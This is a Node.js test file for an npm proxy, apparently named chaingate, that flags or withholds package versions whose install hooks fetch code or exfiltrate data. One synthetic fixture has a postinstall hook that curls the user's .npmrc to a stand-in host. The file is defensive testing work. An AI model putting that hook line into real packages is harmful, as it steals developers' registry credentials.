// 0.1.5 static checks: S0 and S5 NAMED. Operator ruling 2026-10-15 (relayed by the orchestrator, recorded in the ops handover 11.4):
// S0 shell-fetch-in-hook and S5 oversized-hook-target are named; S1, S2, S3, S4 stay contributing. Basis: the static-checks-1.2
// re-measure (handover 11.1): S0 and S5 at 0 benign per 10k on 19,614 versions, recall S0 10/1,422 + 2,731/25,196 and S5 382/1,413 +
// 6/24,941, not-checked share <= 1 %, p99 < 50 ms. With it, the operator's S0 wording (2026-10-15) goes in under a WORDING-ONLY bump,
// static-checks-1.3 (contract 3.5; orchestrator verdict 20:25Z): markers, thresholds and roles of 1.2 unchanged, outcomes identical by
// construction, no re-measure. The policy identity stays cft-policy-1.2 (a role-table change, contract P5).
//   (A) identity: static-checks-1.3; only S0's notice text differs from 1.2;
//   (R) roles: S0 and S5 named runner gates, out of the contributing list; S1-S4 contributing; the notice labels are the CHECKS text;
//   (L) a named static WARN found after the download was served is a late named event (reserved log line + report) and the next
//       download carries its notice (design note section 5);
//   (W) the #15 switch at server level: on, the download that reveals a named static WARN is withheld, and every later one until
//       `chaingate accept`; off, served as today.
// Written failing-first against 3df8e64. Tarballs are synthetic TEXT; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import { classify } from '../../witness/row-class.js';

const SC = () => import('../../proxy/static-checks.js');
const RC = () => import('../../gates/row-class.js');
const POLM = () => import('../../seed/v3/policy.js');
const NOT = () => import('../../proxy/notice.js');
const S0G = 'static:S0-shell-fetch-in-hook';
const S5G = 'static:S5-oversized-hook-target';
const S0_TEXT = 'an install script downloads code to run or sends data to an outside host';
const S5_TEXT = 'an install script runs a file too large to read';

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const BENIGN = 'module.exports = 1;\n';
const BIG = `// ${'x'.repeat(1536 * 1024)}\n`;                 // 1.5 MiB hook target: over the 1 MiB keep cap, well under the 8 MiB hold cap

// each 1.1.0 adds an install hook 48 h after a hookless 1.0.0 -> install-introduced WARN (named) -> the walk is armed
const doc = (name, scripts) => ({ name, 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
  versions: { '1.0.0': { name, version: '1.0.0', main: 'index.js' }, '1.1.0': { name, version: '1.1.0', main: 'index.js', scripts } } });
const Z = doc('z', { postinstall: 'node install.js' });                                        // S5: the hook target is 1.5 MiB
const X = doc('x', { postinstall: 'curl -s --data-binary @.npmrc https://collect.example.invalid/in' });   // S0: hook-command exfiltration
const DOCS = { '/z': Z, '/x': X };
const TARBALLS = {
  '/z/-/z-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(Z.versions['1.1.0']), 'install.js': BIG, 'index.js': BENIGN }),
  '/x/-/x-1.1.0.tgz': tgz({ 'package.json': JSON.stringify(X.versions['1.1.0']), 'index.js': BENIGN }),
};
async function withProxy(config, fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s9-'));
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream', 'content-length': String(TARBALLS[u].length) }); res.end(TARBALLS[u]); return; }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 20_000, ...config });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  const logs = []; const realErr = console.error; console.error = (m) => logs.push(String(m));
  try { return await fn({ base, proxy, logs }); } finally {
    console.error = realErr;
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
}).on('error', reject));
const rowsOf = (proxy, pkg, v) => proxy.witnessDb.getLatestDecision(pkg, v)?.gates_fired ?? [];
async function rowEventually(proxy, pkg, v, gate, ms = 5000) {
  const until = Date.now() + ms; let r = rowsOf(proxy, pkg, v).find((g) => g.gate === gate);
  while (!r && Date.now() < until) { await new Promise((x) => setTimeout(x, 50)); r = rowsOf(proxy, pkg, v).find((g) => g.gate === gate); }
  return r;
}
const settle = () => new Promise((r) => setTimeout(r, 250));

// ------------------------------------------------------------------ (A) identity
test('A1 identity: static-checks-1.6 (recon\'s tree mirrored, R5, R9; 1.6 facts only, R11); S0-S5 gates, roles and texts as 1.3; S6, S7 with recon\'s names', async () => {
  const S = await SC();
  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.9');   // declared: 1.7 bound-module sinks, 1.8 S8 and S9 (cft015-static-checks-1.7, -1.8)
  assert.deepEqual(S.CHECKS.map(({ cls: _c, ...c }) => c), [
    { id: 'S0', gate: S0G, roles: null, notice: S0_TEXT },
    { id: 'S1', gate: 'static:S1-loader-in-hook-target', roles: ['hook'], notice: 'an install script runs a small loader that fetches and executes' },
    { id: 'S2', gate: 'static:S2-obfuscated-entry', roles: ['main', 'bin'], notice: 'its entry file is obfuscated code' },
    { id: 'S3', gate: 'static:S3-secret-harvest-with-sink', roles: ['main', 'bin', 'hook'], notice: 'its code reads credentials and sends them to an outside host' },
    { id: 'S4', gate: 'static:S4-wallet-swap-hook', roles: ['main', 'bin'], notice: 'its code rewrites wallet addresses in web traffic' },
    { id: 'S5', gate: S5G, roles: ['hook'], notice: S5_TEXT },
    // rulings R2 and R3 2026-10-21 (cft015-s6-s7), contributing first; recon's names (1.4, unchanged in 1.5); named R7, R9 2026-10-22
    { id: 'S6', gate: 'static:S6-network-beacon-in-hook-target', roles: ['hook'], notice: 'an install script sends details about this machine to the network' },
    { id: 'S7', gate: 'static:S7-entry-capability-gain', roles: ['main', 'bin'], notice: 'its entry file gained a capability its previous version did not have' },
    // static-checks-1.8 (declared, cft015-static-checks-1.8): recon v6.17's names; they read member facts, not kept files
    { id: 'S8', gate: 'static:S8-prebuilt-addon-dropper-in-hook', roles: null, notice: 'an install script loads a prebuilt native module shipped without its source, next to an encoded file' },
    { id: 'S9', gate: 'static:S9-hidden-script-in-gyp-build', roles: null, notice: 'its native build file runs a package script during install and hides the output' },
  ]);
});

// ------------------------------------------------------------------ (R) roles and labels
test('R1 roles: S0 and S5 are named runner gates and out of the contributing list; S1-S4 stay contributing; a named static WARN stays WARN', async () => {
  const R = await RC(); const POL = (await POLM()).default; const S = await SC();
  // declared 2026-10-22 (rulings R7, R9; cft015-named-s6-s7): S6 and S7 are named after S0 and S5
  assert.deepEqual(POL.NAMED_RUNNER_GATES, ['install-introduced', 'dependency-hooks', 'install-manifest-mismatch', 'size-jump-provenance', S0G, S5G,
    'static:S6-network-beacon-in-hook-target', 'static:S7-entry-capability-gain', 'static:S8-prebuilt-addon-dropper-in-hook', 'static:S9-hidden-script-in-gyp-build']);   // S8, S9: 1.8 (declared)
  for (const g of [S0G, S5G]) { assert.ok(!R.CONTRIBUTING_GATES.has(g), g); assert.equal(R.withRole({ gate: g, result: 'WARN', detail: 'd' }).result, 'WARN'); }
  for (const g of S.STATIC_GATES.filter((x) => ![S0G, S5G, 'static:S6-network-beacon-in-hook-target', 'static:S7-entry-capability-gain', 'static:S8-prebuilt-addon-dropper-in-hook', 'static:S9-hidden-script-in-gyp-build'].includes(x))) {
    assert.ok(R.CONTRIBUTING_GATES.has(g), g); assert.ok(!POL.NAMED_RUNNER_GATES.includes(g), g);
    assert.equal(R.withRole({ gate: g, result: 'WARN', detail: 'd' }).result, 'NOTE');
  }
  const c = classify([{ gate: S5G, result: 'WARN', detail: 'd' }, { gate: 'static:S1-loader-in-hook-target', result: 'NOTE', detail: 'd' }]);
  assert.deepEqual(c.named, [S5G]); assert.deepEqual(c.contributing, ['static:S1-loader-in-hook-target']);
  assert.deepEqual(S.withholdingChecks([{ gate: S0G, result: 'WARN', detail: 'd' }, { gate: S5G, result: 'WARN', detail: 'd' }]), [S0G, S5G], 'the default named list now withholds them');
});

test('R2 notice labels: S0 and S5 carry the CHECKS text byte for byte (one wording); S1-S4 have no label', async () => {
  const N = await NOT(); const S = await SC();
  assert.equal(N.labelFor(S0G), S0_TEXT); assert.equal(N.labelFor(S5G), S5_TEXT);
  for (const c of S.CHECKS) if (['S1', 'S2', 'S3', 'S4'].includes(c.id)) assert.equal(N.labelFor(c.gate), null, c.gate);   // S6, S7 labelled since R7, R9 (cft015-named-s6-s7)
  assert.equal(N.buildNotice({ kind: 'WARNING', pkg: 'z', version: '1.1.0', labels: [S5G] }),
    `chaingate: WARNING z@1.1.0: ${S5_TEXT}. Details: chaingate why z@1.1.0`);
});

// ------------------------------------------------------------------ (L) switch off: late named event, notice on the next download
for (const [pkg, gate, text, label] of [['z', S5G, S5_TEXT, 'S5'], ['x', S0G, S0_TEXT, 'S0']]) {
  test(`L1 switch off, ${label}: served; the row is a WARN; a late named event (reserved log line + report entry); the next download says it`, async () => {
    await withProxy({}, async ({ base, proxy, logs }) => {
      await get(`${base}/${pkg}`);
      const t = await get(`${base}/${pkg}/-/${pkg}-1.1.0.tgz`);
      assert.equal(t.status, 200); assert.ok(t.body.equals(TARBALLS[`/${pkg}/-/${pkg}-1.1.0.tgz`]), 'served unchanged');
      const row = await rowEventually(proxy, pkg, '1.1.0', gate);
      assert.equal(row?.result, 'WARN', JSON.stringify(rowsOf(proxy, pkg, '1.1.0')));
      await settle();
      assert.ok(classify(rowsOf(proxy, pkg, '1.1.0')).named.includes(gate));
      assert.ok(logs.some((l) => l.includes(`[gate] ${pkg}@1.1.0: WARN named ${gate} (`)), logs.join('\n'));
      const late = proxy.witnessDb.listNamedFactEvents().filter((e) => JSON.stringify(e).includes(gate));
      assert.equal(late.length, 1, 'one late report entry for the named static row');
      const t2 = await get(`${base}/${pkg}/-/${pkg}-1.1.0.tgz`);
      assert.equal(t2.status, 200);
      assert.ok((t2.headers['npm-notice'] ?? '').includes(text), t2.headers['npm-notice']);
      await settle();
      assert.equal(proxy.witnessDb.listNamedFactEvents().filter((e) => JSON.stringify(e).includes(gate)).length, 1, 'no second late event');
    });
  });
}

// ------------------------------------------------------------------ (W) the #15 switch at server level
test('W1 switch on, S5: the download that reveals it is withheld (403, WITHHELD notice); so is the next; accept releases it', async () => {
  await withProxy({ staticWithhold: true }, async ({ base, proxy }) => {
    await get(`${base}/z`);
    const t = await get(`${base}/z/-/z-1.1.0.tgz`);
    assert.equal(t.status, 403, t.body.toString());
    const body = JSON.parse(t.body.toString());
    assert.equal(body.error, 'withheld_by_static_check'); assert.deepEqual(body.checks, [S5G]);
    assert.equal(t.headers['npm-notice'], `chaingate: WITHHELD z@1.1.0: ${S5_TEXT} (your static_withhold setting). Details: chaingate why z@1.1.0`);
    const row = await rowEventually(proxy, 'z', '1.1.0', S5G);
    assert.equal(row?.result, 'WARN', 'a withheld download is recorded: its rows withheld it');
    const t2 = await get(`${base}/z/-/z-1.1.0.tgz`);
    assert.equal(t2.status, 403, 'withheld at every later download');
    const named = classify(rowsOf(proxy, 'z', '1.1.0')).named;
    proxy.witnessDb.upsertAcceptance({ package_name: 'z', version: '1.1.0', named });
    const t3 = await get(`${base}/z/-/z-1.1.0.tgz`);
    assert.equal(t3.status, 200); assert.ok(t3.body.equals(TARBALLS['/z/-/z-1.1.0.tgz']));
  });
});

test('W2 switch on, S0: withheld with S0\'s wording; switch off the same version is served', async () => {
  await withProxy({ staticWithhold: true }, async ({ base }) => {
    await get(`${base}/x`);
    const t = await get(`${base}/x/-/x-1.1.0.tgz`);
    assert.equal(t.status, 403, t.body.toString());
    assert.deepEqual(JSON.parse(t.body.toString()).checks, [S0G]);
    assert.ok((t.headers['npm-notice'] ?? '').includes(S0_TEXT));
  });
  await withProxy({}, async ({ base }) => {
    await get(`${base}/x`);
    assert.equal((await get(`${base}/x/-/x-1.1.0.tgz`)).status, 200);
  });
});
